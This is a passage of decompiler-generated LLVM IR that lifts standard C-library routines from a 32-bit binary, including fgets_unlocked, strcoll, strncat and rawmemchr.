  %v2_804cecc = call i32 @__pthread_return_void(i32 %v2_804ce77, i32 1)
  %v0_804cf4e1 = load i32, i32* @esi, align 4
  %v1_804cf4e2 = icmp eq i32 %v0_804cf4e1, 0
  %v1_804cf509 = icmp eq i1 %v1_804cf4e2, false
  br i1 %v1_804cf509, label %dec_label_pc_804ced6, label %dec_label_pc_804cf52

dec_label_pc_804ced6:                             ; preds = %dec_label_pc_804ce6a, %dec_label_pc_804cf4b
  %v0_804cee4 = phi i32 [ %v3_804cf4b, %dec_label_pc_804cf4b ], [ %v0_804cf4e1, %dec_label_pc_804ce6a ]
  %v1_804ced6 = inttoptr i32 %v0_804cee4 to i8*
  %v2_804ced6 = load i8, i8* %v1_804ced6, align 1
  %v3_804ced6 = and i8 %v2_804ced6, 64
  %v4_804ced6 = icmp eq i8 %v3_804ced6, 0
  br i1 %v4_804ced6, label %dec_label_pc_804cf4b, label %dec_label_pc_804cedb

dec_label_pc_804cedb:                             ; preds = %dec_label_pc_804ced6
  %v0_804cedb = load i32, i32* @global_var_80521c0.101, align 64
  %v9_804cedb = icmp eq i32 %v0_804cedb, 2
  br i1 %v9_804cedb, label %dec_label_pc_804cf03, label %dec_label_pc_804cee4

dec_label_pc_804cee4:                             ; preds = %dec_label_pc_804cedb
  %v1_804cee4 = add i32 %v0_804cee4, 56
  store i32 %v1_804cee4, i32* @ebx, align 4
  store i32 %v2_804ce77, i32* @eax, align 4
  %v2_804cef3 = call i32 @__pthread_return_void(i32 %v2_804ce77, i32 134526427)
  %v0_804cef8 = load i32, i32* @ebx, align 4
  %v1_804cefb = call i32 @__pthread_return_0(i32 %v0_804cef8)
  %v1_804cf05.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cf03

dec_label_pc_804cf03:                             ; preds = %dec_label_pc_804cedb, %dec_label_pc_804cee4
  %v0_804cf15 = phi i32 [ %v0_804cee4, %dec_label_pc_804cedb ], [ %v1_804cf05.pre, %dec_label_pc_804cee4 ]
  %v0_804cf03 = load i32, i32* @ebp, align 4
  %v2_804cf05 = inttoptr i32 %v0_804cf15 to i32*
  %v3_804cf05 = load i32, i32* %v2_804cf05, align 4
  %v4_804cf05 = or i32 %v3_804cf05, %v0_804cf03
  %v2_804cf07 = urem i32 %v4_804cf05, 65536
  %v9_804cf07 = and i32 %v2_804cf07, 832
  %v2_804cf0b = icmp eq i32 %v9_804cf07, 320
  %v1_804cf10 = icmp eq i1 %v2_804cf0b, false
  br i1 %v1_804cf10, label %dec_label_pc_804cf31, label %dec_label_pc_804cf12

dec_label_pc_804cf12:                             ; preds = %dec_label_pc_804cf03
  %v1_804cf16 = call i32 @__stdio_wcommit(i32 %v0_804cf15)
  %v1_804cf1e = icmp eq i32 %v1_804cf16, 0
  br i1 %v1_804cf1e, label %dec_label_pc_804cf27, label %dec_label_pc_804cf22

dec_label_pc_804cf22:                             ; preds = %dec_label_pc_804cf12
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804cf31

dec_label_pc_804cf27:                             ; preds = %dec_label_pc_804cf12
  %v0_804cf27 = load i32, i32* @esi, align 4
  %v1_804cf27 = inttoptr i32 %v0_804cf27 to i16*
  %v2_804cf27 = load i16, i16* %v1_804cf27, align 2
  %v3_804cf27 = and i16 %v2_804cf27, -65
  store i16 %v3_804cf27, i16* %v1_804cf27, align 2
  %v0_804cf2b = load i32, i32* @esi, align 4
  %v1_804cf2b = add i32 %v0_804cf2b, 8
  %v2_804cf2b = inttoptr i32 %v1_804cf2b to i32*
  %v3_804cf2b = load i32, i32* %v2_804cf2b, align 4
  %v2_804cf2e = add i32 %v0_804cf2b, 28
  %v3_804cf2e = inttoptr i32 %v2_804cf2e to i32*
  store i32 %v3_804cf2b, i32* %v3_804cf2e, align 4
  br label %dec_label_pc_804cf31

dec_label_pc_804cf31:                             ; preds = %dec_label_pc_804cf03, %dec_label_pc_804cf22, %dec_label_pc_804cf27
  %v0_804cf31 = load i32, i32* @global_var_80521c0.101, align 64
  %v9_804cf31 = icmp eq i32 %v0_804cf31, 2
  br i1 %v9_804cf31, label %dec_label_pc_804cf4b, label %dec_label_pc_804cf3a

dec_label_pc_804cf3a:                             ; preds = %dec_label_pc_804cf31
  store i32 %v2_804ce77, i32* @eax, align 4
  %v2_804cf43 = call i32 @__pthread_return_void(i32 %v2_804ce77, i32 1)
  br label %dec_label_pc_804cf4b

dec_label_pc_804cf4b:                             ; preds = %dec_label_pc_804cf31, %dec_label_pc_804ced6, %dec_label_pc_804cf3a
  %v0_804cf4b = load i32, i32* @esi, align 4
  %v1_804cf4b = add i32 %v0_804cf4b, 32
  %v2_804cf4b = inttoptr i32 %v1_804cf4b to i32*
  %v3_804cf4b = load i32, i32* %v2_804cf4b, align 4
  store i32 %v3_804cf4b, i32* @esi, align 4
  %v1_804cf4e = icmp eq i32 %v3_804cf4b, 0
  %v1_804cf50 = icmp eq i1 %v1_804cf4e, false
  br i1 %v1_804cf50, label %dec_label_pc_804ced6, label %dec_label_pc_804cf52

dec_label_pc_804cf52:                             ; preds = %dec_label_pc_804cf4b, %dec_label_pc_804ce6a
  %v0_804cf52 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_804cf7f

dec_label_pc_804cf59:                             ; preds = %dec_label_pc_804ce5d
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_804cf5b = load i8, i8* %tmp23, align 1
  %v4_804cf5b = and i8 %v3_804cf5b, 64
  %v5_804cf5b = icmp eq i8 %v4_804cf5b, 0
  br i1 %v5_804cf5b, label %dec_label_pc_804cf7f, label %dec_label_pc_804cf60

dec_label_pc_804cf60:                             ; preds = %dec_label_pc_804cf59
  store i32 -1, i32* @edi, align 4
  %v1_804cf67 = call i32 @__stdio_wcommit(i32 %v4_804ce51)
  %v1_804cf6f = icmp eq i32 %v1_804cf67, 0
  %v1_804cf71 = icmp eq i1 %v1_804cf6f, false
  br i1 %v1_804cf71, label %dec_label_pc_804cf7f, label %dec_label_pc_804cf73

dec_label_pc_804cf73:                             ; preds = %dec_label_pc_804cf60
  %v3_804cf73 = load i16, i16* %arg1, align 2
  %v4_804cf73 = and i16 %v3_804cf73, -65
  store i16 %v4_804cf73, i16* %arg1, align 2
  %v2_804cf77 = add i32 %v4_804ce51, 8
  %v3_804cf77 = inttoptr i32 %v2_804cf77 to i32*
  %v4_804cf77 = load i32, i32* %v3_804cf77, align 4
  %v3_804cf7a = add i32 %v4_804ce51, 28
  %v4_804cf7a = inttoptr i32 %v3_804cf7a to i32*
  store i32 %v4_804cf77, i32* %v4_804cf7a, align 4
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804cf7f

dec_label_pc_804cf7f:                             ; preds = %dec_label_pc_804cf60, %dec_label_pc_804cf59, %dec_label_pc_804cf52, %dec_label_pc_804cf73
  %v0_804cf82 = load i32, i32* @edi, align 4
  store i32 %v0_804ce4b, i32* @ebx, align 4
  store i32 %v0_804ce4a, i32* @esi, align 4
  store i32 %v0_804ce49, i32* @edi, align 4
  store i32 %v0_804ce48, i32* @ebp, align 4
  ret i32 %v0_804cf82

; uselistorder directives
  uselistorder i32 %v3_804cf4b, { 1, 2, 0 }
  uselistorder i32 %v2_804ce77, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805218c.104 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_8052548.99, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_80521a8.98 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 1, 4, 3, 2, 0, 5 }
  uselistorder label %dec_label_pc_804cf7f, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804cf4b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cf31, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804cf03, { 1, 0 }
  uselistorder label %dec_label_pc_804ced6, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_804cf8c = load i32, i32* @ebp, align 4
  %v4_804cf93 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804cf93, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_804cf93, i32* @ebx, align 4
  %tmp16 = icmp slt i32 %arg2, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_804cfdd.preheader, label %dec_label_pc_804cfe9

dec_label_pc_804cfdd.preheader:                   ; preds = %entry
  %v1_804cfdd18 = add i32 %arg2, -1
  %v8_804cfdd19 = icmp eq i32 %v1_804cfdd18, 0
  store i32 %v1_804cfdd18, i32* @esi, align 4
  %v1_804cfde20 = icmp eq i1 %v8_804cfdd19, false
  br i1 %v1_804cfde20, label %dec_label_pc_804cfa7, label %dec_label_pc_804cfe0

dec_label_pc_804cfa7:                             ; preds = %dec_label_pc_804cfdd.preheader, %dec_label_pc_804cfdb.dec_label_pc_804cfdd_crit_edge.dec_label_pc_804cfa7_crit_edge
  %v0_804cfa7 = phi i32 [ %v0_804cfa7.pre, %dec_label_pc_804cfdb.dec_label_pc_804cfdd_crit_edge.dec_label_pc_804cfa7_crit_edge ], [ %arg3, %dec_label_pc_804cfdd.preheader ]
  %v1_804cfa7 = add i32 %v0_804cfa7, 16
  %v2_804cfa7 = inttoptr i32 %v1_804cfa7 to i32*
  %v3_804cfa7 = load i32, i32* %v2_804cfa7, align 4
  store i32 %v3_804cfa7, i32* %eax.global-to-local, align 4
  %v2_804cfaa = add i32 %v0_804cfa7, 24
  %v3_804cfaa = inttoptr i32 %v2_804cfaa to i32*
  %v4_804cfaa = load i32, i32* %v3_804cfaa, align 4
  %v10_804cfaa = icmp ult i32 %v3_804cfa7, %v4_804cfaa
  %v1_804cfad = icmp eq i1 %v10_804cfaa, false
  br i1 %v1_804cfad, label %dec_label_pc_804cfbd, label %dec_label_pc_804cfaf

dec_label_pc_804cfaf:                             ; preds = %dec_label_pc_804cfa7
  %v1_804cfaf = inttoptr i32 %v3_804cfa7 to i8*
  %v2_804cfaf = load i8, i8* %v1_804cfaf, align 1
  %v3_804cfaf = zext i8 %v2_804cfaf to i32
  %v4_804cfaf = load i32, i32* @edx, align 4
  %v5_804cfaf = and i32 %v4_804cfaf, -256
  %v6_804cfaf = or i32 %v5_804cfaf, %v3_804cfaf
  store i32 %v6_804cfaf, i32* @edx, align 4
  %v1_804cfb1 = add i32 %v3_804cfa7, 1
  store i32 %v1_804cfb1, i32* %eax.global-to-local, align 4
  %v2_804cfb2 = load i32, i32* @ebx, align 4
  %v3_804cfb2 = inttoptr i32 %v2_804cfb2 to i8*
  store i8 %v2_804cfaf, i8* %v3_804cfb2, align 1
  %v0_804cfb4 = load i32, i32* @ebx, align 4
  %v1_804cfb4 = add i32 %v0_804cfb4, 1
  store i32 %v1_804cfb4, i32* @ebx, align 4
  %v0_804cfb5 = load i32, i32* @edx, align 4
  %v1_804cfb5 = trunc i32 %v0_804cfb5 to i8
  %v10_804cfb5 = icmp eq i8 %v1_804cfb5, 10
  %v0_804cfb8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cfb8 = load i32, i32* @ebp, align 4
  %v2_804cfb8 = add i32 %v1_804cfb8, 16
  %v3_804cfb8 = inttoptr i32 %v2_804cfb8 to i32*
  store i32 %v0_804cfb8, i32* %v3_804cfb8, align 4
  br i1 %v10_804cfb5, label %dec_label_pc_804cfe0, label %dec_label_pc_804cfdb.dec_label_pc_804cfdd_crit_edge

dec_label_pc_804cfbd:                             ; preds = %dec_label_pc_804cfa7
  %v0_804cfc1 = call i32 @getc_unlocked()
  %v1_804cfc1 = trunc i32 %v0_804cfc1 to i8
  store i32 %v0_804cfc1, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_804cfc1, 256
  %v11_804cfc9 = icmp eq i32 %sext.mask, 255
  %v1_804cfcc = icmp eq i1 %v11_804cfc9, false
  br i1 %v1_804cfcc, label %dec_label_pc_804cfdb, label %dec_label_pc_804cfce

dec_label_pc_804cfce:                             ; preds = %dec_label_pc_804cfbd
  %v0_804cfce = load i32, i32* @ebp, align 4
  %v1_804cfce = inttoptr i32 %v0_804cfce to i8*
  %v2_804cfce = load i8, i8* %v1_804cfce, align 1
  %v3_804cfce = and i8 %v2_804cfce, 8
  %v4_804cfce = icmp eq i8 %v3_804cfce, 0
  br i1 %v4_804cfce, label %dec_label_pc_804cfe0, label %dec_label_pc_804cfe9

dec_label_pc_804cfdb:                             ; preds = %dec_label_pc_804cfbd
  %v3_804cfd6 = load i32, i32* @ebx, align 4
  %v4_804cfd6 = inttoptr i32 %v3_804cfd6 to i8*
  store i8 %v1_804cfc1, i8* %v4_804cfd6, align 1
  %v0_804cfd8 = load i32, i32* @ebx, align 4
  %v1_804cfd8 = add i32 %v0_804cfd8, 1
  store i32 %v1_804cfd8, i32* @ebx, align 4
  %v11_804cfd9 = icmp eq i8 %v1_804cfc1, 10
  br i1 %v11_804cfd9, label %dec_label_pc_804cfe0, label %dec_label_pc_804cfdb.dec_label_pc_804cfdd_crit_edge

dec_label_pc_804cfdb.dec_label_pc_804cfdd_crit_edge: ; preds = %dec_label_pc_804cfaf, %dec_label_pc_804cfdb
  %v0_804cfdd.pre = load i32, i32* @esi, align 4
  %v1_804cfdd = add i32 %v0_804cfdd.pre, -1
  %v8_804cfdd = icmp eq i32 %v1_804cfdd, 0
  store i32 %v1_804cfdd, i32* @esi, align 4
  %v1_804cfde = icmp eq i1 %v8_804cfdd, false
  br i1 %v1_804cfde, label %dec_label_pc_804cfdb.dec_label_pc_804cfdd_crit_edge.dec_label_pc_804cfa7_crit_edge, label %dec_label_pc_804cfe0

dec_label_pc_804cfdb.dec_label_pc_804cfdd_crit_edge.dec_label_pc_804cfa7_crit_edge: ; preds = %dec_label_pc_804cfdb.dec_label_pc_804cfdd_crit_edge
  %v0_804cfa7.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804cfa7

dec_label_pc_804cfe0:                             ; preds = %dec_label_pc_804cfdd.preheader, %dec_label_pc_804cfaf, %dec_label_pc_804cfdb.dec_label_pc_804cfdd_crit_edge, %dec_label_pc_804cfdb, %dec_label_pc_804cfce
  %v0_804cfe0 = load i32, i32* @ebx, align 4
  %v1_804cfe0 = load i32, i32* @edi, align 4
  %tmp22 = icmp ugt i32 %v0_804cfe0, %v1_804cfe0
  br i1 %tmp22, label %dec_label_pc_804cfe4, label %dec_label_pc_804cfe9

dec_label_pc_804cfe4:                             ; preds = %dec_label_pc_804cfe0
  %v1_804cfe4 = inttoptr i32 %v0_804cfe0 to i8*
  store i8 0, i8* %v1_804cfe4, align 1
  %v0_804cfee.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804cfeb

dec_label_pc_804cfe9:                             ; preds = %dec_label_pc_804cfe0, %dec_label_pc_804cfce, %entry
  br label %dec_label_pc_804cfeb

dec_label_pc_804cfeb:                             ; preds = %dec_label_pc_804cfe4, %dec_label_pc_804cfe9
  %v0_804cfee = phi i32 [ %v0_804cfee.pre, %dec_label_pc_804cfe4 ], [ 0, %dec_label_pc_804cfe9 ]
  store i32 %v0_804cfee, i32* %eax.global-to-local, align 4
  store i32 %v0_804cf8c, i32* @ebp, align 4
  ret i32 %v0_804cfee

; uselistorder directives
  uselistorder i32 %v0_804cfee, { 1, 0 }
  uselistorder i32 %v0_804cfe0, { 1, 0 }
  uselistorder i32 %v1_804cfdd, { 1, 0 }
  uselistorder i32 %v0_804cfc1, { 0, 2, 1 }
  uselistorder i32 %v0_804cfa7, { 1, 0 }
  uselistorder label %dec_label_pc_804cfeb, { 1, 0 }
  uselistorder label %dec_label_pc_804cfe0, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_804cfdb.dec_label_pc_804cfdd_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804cfa7, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_804cffa = ptrtoint i8* %arg1 to i32
  %v4_804d002.pre = load i32, i32* @eax, align 4
  %v8_804d002.pre = load i1, i1* @df, align 1
  %v9_804d002 = select i1 %v8_804d002.pre, i32 -1, i32 1
  br label %dec_label_pc_804d002

dec_label_pc_804d002:                             ; preds = %dec_label_pc_804d006, %entry
  %v20_804d003 = phi i32 [ %v23_804d003, %dec_label_pc_804d006 ], [ %arg2, %entry ]
  %v4_804d002 = phi i32 [ %v6_804d002, %dec_label_pc_804d006 ], [ %v4_804d002.pre, %entry ]
  %v7_804d002 = phi i32 [ %v10_804d002, %dec_label_pc_804d006 ], [ %v4_804cffa, %entry ]
  %v1_804d002 = inttoptr i32 %v7_804d002 to i8*
  %v2_804d002 = load i8, i8* %v1_804d002, align 1
  %v3_804d003 = inttoptr i32 %v20_804d003 to i8*
  %v4_804d003 = load i8, i8* %v3_804d003, align 1
  %v15_804d003 = icmp eq i8 %v2_804d002, %v4_804d003
  %v1_804d004 = icmp eq i1 %v15_804d003, false
  br i1 %v1_804d004, label %dec_label_pc_804d00e, label %dec_label_pc_804d006

dec_label_pc_804d006:                             ; preds = %dec_label_pc_804d002
  %v3_804d002 = zext i8 %v2_804d002 to i32
  %v5_804d002 = and i32 %v4_804d002, -256
  %v6_804d002 = or i32 %v3_804d002, %v5_804d002
  %v23_804d003 = add i32 %v20_804d003, %v9_804d002
  %v10_804d002 = add i32 %v7_804d002, %v9_804d002
  %v4_804d006 = icmp eq i8 %v2_804d002, 0
  %v1_804d008 = icmp eq i1 %v4_804d006, false
  br i1 %v1_804d008, label %dec_label_pc_804d002, label %dec_label_pc_804d012

dec_label_pc_804d00e:                             ; preds = %dec_label_pc_804d002
  br label %dec_label_pc_804d012

dec_label_pc_804d012:                             ; preds = %dec_label_pc_804d006, %dec_label_pc_804d00e
  %storemerge = phi i32 [ 1, %dec_label_pc_804d00e ], [ 0, %dec_label_pc_804d006 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_804d002, { 1, 2, 0 }
  uselistorder i32 %v9_804d002, { 1, 0 }
  uselistorder label %dec_label_pc_804d012, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-8 = alloca i32, align 4
  %v0_804d02d = load i32, i32* @esi, align 4
  store i32 %v0_804d02d, i32* %stack_var_-8, align 4
  %v4_804d02e = ptrtoint i8* %tmp5 to i32
  store i32 %v4_804d02e, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_804d03b = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_804d03f = call i32 @_strlen(i8* %v4_804d03b)
  %v2_804d041 = add i32 %tmp, -1
  store i32 %v2_804d041, i32* %edi.global-to-local, align 4
  %v0_804d042 = load i32, i32* %edx.global-to-local, align 4
  %v8_804d04510 = icmp eq i32 %v0_804d042, 0
  store i32 %v0_804d042, i32* %ecx.global-to-local, align 4
  br i1 %v8_804d04510, label %dec_label_pc_804d050, label %dec_label_pc_804d048.lr.ph

dec_label_pc_804d048.lr.ph:                       ; preds = %entry
  %v4_804d048.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_804d048.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804d048

dec_label_pc_804d048:                             ; preds = %dec_label_pc_804d048.lr.ph, %dec_label_pc_804d048.dec_label_pc_804d045_crit_edge
  %v8_804d048 = phi i1 [ %v8_804d048.pre, %dec_label_pc_804d048.lr.ph ], [ %v5_804d049, %dec_label_pc_804d048.dec_label_pc_804d045_crit_edge ]
  %v4_804d048 = phi i32 [ %v4_804d048.pre, %dec_label_pc_804d048.lr.ph ], [ %v0_804d04a, %dec_label_pc_804d048.dec_label_pc_804d045_crit_edge ]
  %v2_804d05211 = phi i32 [ %v2_804d041, %dec_label_pc_804d048.lr.ph ], [ %v7_804d049, %dec_label_pc_804d048.dec_label_pc_804d045_crit_edge ]
  %v0_804d048 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d048 = inttoptr i32 %v0_804d048 to i8*
  %v2_804d048 = load i8, i8* %v1_804d048, align 1
  %v3_804d048 = zext i8 %v2_804d048 to i32
  %v5_804d048 = and i32 %v4_804d048, -256
  %v6_804d048 = or i32 %v5_804d048, %v3_804d048
  store i32 %v6_804d048, i32* %eax.global-to-local, align 4
  %v9_804d048 = select i1 %v8_804d048, i32 -1, i32 1
  %v10_804d048 = add i32 %v9_804d048, %v0_804d048
  store i32 %v10_804d048, i32* %esi.global-to-local, align 4
  %v3_804d049 = inttoptr i32 %v2_804d05211 to i8*
  store i8 %v2_804d048, i8* %v3_804d049, align 1
  %v4_804d049 = load i32, i32* %edi.global-to-local, align 4
  %v5_804d049 = load i1, i1* @df, align 1
  %v6_804d049 = select i1 %v5_804d049, i32 -1, i32 1
  %v7_804d049 = add i32 %v6_804d049, %v4_804d049
  store i32 %v7_804d049, i32* %edi.global-to-local, align 4
  %v0_804d04a = load i32, i32* %eax.global-to-local, align 4
  %v3_804d04a = trunc i32 %v0_804d04a to i8
  %v4_804d04a = icmp eq i8 %v3_804d04a, 0
  %v1_804d04c = icmp eq i1 %v4_804d04a, false
  br i1 %v1_804d04c, label %dec_label_pc_804d048.dec_label_pc_804d045_crit_edge, label %dec_label_pc_804d053

dec_label_pc_804d048.dec_label_pc_804d045_crit_edge: ; preds = %dec_label_pc_804d048
  %v0_804d045.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d045 = add i32 %v0_804d045.pre, -1
  %v8_804d045 = icmp eq i32 %v1_804d045, 0
  store i32 %v1_804d045, i32* %ecx.global-to-local, align 4
  br i1 %v8_804d045, label %dec_label_pc_804d050, label %dec_label_pc_804d048

dec_label_pc_804d050:                             ; preds = %dec_label_pc_804d048.dec_label_pc_804d045_crit_edge, %entry
  %v2_804d052.lcssa = phi i32 [ %v2_804d041, %entry ], [ %v7_804d049, %dec_label_pc_804d048.dec_label_pc_804d045_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804d052 = inttoptr i32 %v2_804d052.lcssa to i8*
  store i8 0, i8* %v3_804d052, align 1
  %v4_804d052 = load i32, i32* %edi.global-to-local, align 4
  %v5_804d052 = load i1, i1* @df, align 1
  %v6_804d052 = select i1 %v5_804d052, i32 -1, i32 1
  %v7_804d052 = add i32 %v6_804d052, %v4_804d052
  store i32 %v7_804d052, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d053

dec_label_pc_804d053:                             ; preds = %dec_label_pc_804d048, %dec_label_pc_804d050
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_804d057 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d057, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_804d045, { 1, 0 }
  uselistorder i32 %v0_804d04a, { 1, 0 }
  uselistorder i32 %v7_804d049, { 0, 2, 1 }
  uselistorder i1 %v5_804d049, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804d053, { 1, 0 }
  uselistorder label %dec_label_pc_804d048, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804d05d = load i32, i32* @ebx, align 4
  %v4_804d05e = urem i32 %arg2, 256
  %v4_804d062 = ptrtoint i8* %arg1 to i32
  %v2_804d06d3 = urem i32 %v4_804d062, 4
  %v3_804d06d4 = icmp eq i32 %v2_804d06d3, 0
  %v1_804d06f8 = icmp eq i1 %v3_804d06d4, false
  %v4_804d068 = trunc i32 %arg2 to i8
  br i1 %v1_804d06f8, label %dec_label_pc_804d068, label %dec_label_pc_804d071

dec_label_pc_804d068:                             ; preds = %entry, %dec_label_pc_804d06c
  %v0_804d06c = phi i32 [ %v1_804d06c, %dec_label_pc_804d06c ], [ %v4_804d062, %entry ]
  %v1_804d068 = inttoptr i32 %v0_804d06c to i8*
  %v2_804d068 = load i8, i8* %v1_804d068, align 1
  %v15_804d068 = icmp eq i8 %v2_804d068, %v4_804d068
  br i1 %v15_804d068, label %dec_label_pc_804d0bc, label %dec_label_pc_804d06c

dec_label_pc_804d06c:                             ; preds = %dec_label_pc_804d068
  %v1_804d06c = add i32 %v0_804d06c, 1
  %v2_804d06d = urem i32 %v1_804d06c, 4
  %v3_804d06d = icmp eq i32 %v2_804d06d, 0
  %v1_804d06f = icmp eq i1 %v3_804d06d, false
  br i1 %v1_804d06f, label %dec_label_pc_804d068, label %dec_label_pc_804d071

dec_label_pc_804d071:                             ; preds = %entry, %dec_label_pc_804d06c
  %v0_804d074 = phi i32 [ %v1_804d06c, %dec_label_pc_804d06c ], [ %v4_804d062, %entry ]
  %v2_804d078 = mul nuw nsw i32 %v4_804d05e, 256
  %v2_804d07b = or i32 %v2_804d078, %v4_804d05e
  %v2_804d07f = mul i32 %v2_804d07b, 65536
  %v2_804d082 = or i32 %v2_804d07f, %v2_804d07b
  br label %dec_label_pc_804d084

dec_label_pc_804d084:                             ; preds = %dec_label_pc_804d0b4, %dec_label_pc_804d084, %dec_label_pc_804d071
  %v0_804d088 = phi i32 [ %v0_804d074, %dec_label_pc_804d071 ], [ %v1_804d088, %dec_label_pc_804d084 ], [ %v1_804d088, %dec_label_pc_804d0b4 ]
  %v2_804d086 = inttoptr i32 %v0_804d088 to i32*
  %v3_804d086 = load i32, i32* %v2_804d086, align 4
  %v4_804d086 = xor i32 %v3_804d086, %v2_804d082
  %v1_804d088 = add i32 %v0_804d088, 4
  store i32 %v1_804d088, i32* @ecx, align 4
  %v1_804d08b = add i32 %v4_804d086, 2130640639
  %v1_804d091 = sub i32 -1, %v4_804d086
  store i32 %v1_804d091, i32* @edx, align 4
  %v2_804d093 = xor i32 %v1_804d08b, %v1_804d091
  %v1_804d095 = and i32 %v2_804d093, -2130640640
  %v2_804d095 = icmp eq i32 %v1_804d095, 0
  br i1 %v2_804d095, label %dec_label_pc_804d084, label %dec_label_pc_804d09c

dec_label_pc_804d09c:                             ; preds = %dec_label_pc_804d084
  %v2_804d09f = inttoptr i32 %v0_804d088 to i8*
  %v3_804d09f = load i8, i8* %v2_804d09f, align 1
  %v16_804d09f = icmp eq i8 %v3_804d09f, %v4_804d068
  br i1 %v16_804d09f, label %dec_label_pc_804d0bc, label %dec_label_pc_804d0a4

dec_label_pc_804d0a4:                             ; preds = %dec_label_pc_804d09c
  %v1_804d0a4 = add i32 %v0_804d088, 1
  %v2_804d0a7 = inttoptr i32 %v1_804d0a4 to i8*
  %v3_804d0a7 = load i8, i8* %v2_804d0a7, align 1
  %v16_804d0a7 = icmp eq i8 %v3_804d0a7, %v4_804d068
  br i1 %v16_804d0a7, label %dec_label_pc_804d0bc, label %dec_label_pc_804d0ac

dec_label_pc_804d0ac:                             ; preds = %dec_label_pc_804d0a4
  %v1_804d0ac = add i32 %v0_804d088, 2
  %v2_804d0af = inttoptr i32 %v1_804d0ac to i8*
  %v3_804d0af = load i8, i8* %v2_804d0af, align 1
  %v16_804d0af = icmp eq i8 %v3_804d0af, %v4_804d068
  br i1 %v16_804d0af, label %dec_label_pc_804d0bc, label %dec_label_pc_804d0b4

dec_label_pc_804d0b4:                             ; preds = %dec_label_pc_804d0ac
  %v1_804d0b4 = add i32 %v0_804d088, 3
  %v2_804d0b7 = inttoptr i32 %v1_804d0b4 to i8*
  %v3_804d0b7 = load i8, i8* %v2_804d0b7, align 1
  %v16_804d0b7 = icmp eq i8 %v3_804d0b7, %v4_804d068
  %v1_804d0ba = icmp eq i1 %v16_804d0b7, false
  br i1 %v1_804d0ba, label %dec_label_pc_804d084, label %dec_label_pc_804d0bc

dec_label_pc_804d0bc:                             ; preds = %dec_label_pc_804d068, %dec_label_pc_804d0b4, %dec_label_pc_804d0ac, %dec_label_pc_804d0a4, %dec_label_pc_804d09c
  %v0_804d0be = phi i32 [ %v1_804d0b4, %dec_label_pc_804d0b4 ], [ %v1_804d0ac, %dec_label_pc_804d0ac ], [ %v1_804d0a4, %dec_label_pc_804d0a4 ], [ %v0_804d088, %dec_label_pc_804d09c ], [ %v0_804d06c, %dec_label_pc_804d068 ]
  store i32 %v0_804d05d, i32* @ebx, align 4
  ret i32 %v0_804d0be

; uselistorder directives
  uselistorder i32 %v1_804d091, { 1, 0 }
  uselistorder i32 %v1_804d088, { 2, 1, 0 }
  uselistorder i32 %v2_804d07b, { 1, 0 }
  uselistorder i32 %v1_804d06c, { 1, 0, 2 }
  uselistorder i32 %v4_804d062, { 2, 1, 0 }
  uselistorder i32 %v4_804d05e, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804d0bc, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_804d071, { 1, 0 }
  uselistorder label %dec_label_pc_804d068, { 1, 0 }
}

